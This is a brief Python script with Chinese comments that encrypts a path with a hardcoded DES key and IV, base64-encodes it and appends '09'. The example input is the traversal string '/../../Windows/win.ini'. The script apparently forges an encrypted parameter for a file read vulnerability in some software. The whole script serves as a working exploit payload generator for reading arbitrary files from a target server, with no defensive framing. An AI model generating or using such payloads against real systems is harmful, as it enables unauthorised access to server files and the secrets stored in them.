from Crypto.Cipher import DES
import base64

def enc(plain_text):
    key = b'\x66\x10\x5d\x9c\x4e\x04\xda\x20'
    iv = b'\x37\x67\xf6\x4f\x24\x63\xa7\x03'

    # 将明文转换为字节数组
    plain_bytes = plain_text.encode('utf-8')

    # 创建 DES 加密器
    cipher = DES.new(key, DES.MODE_CBC, iv)

    # 计算加密后的数据长度，并进行填充
    block_size = 8
    padded_text = plain_bytes + (block_size - len(plain_bytes) % block_size) * chr(block_size - len(plain_bytes) % block_size).encode()

    # 执行加密
    encrypted_bytes = cipher.encrypt(padded_text)

    # 将加密后的数据转换为 Base64 字符串
    encrypted_text = base64.b64encode(encrypted_bytes).decode('utf-8')

    return encrypted_text + "09"

# 示例
result = enc("/../../Windows/win.ini")
print(result)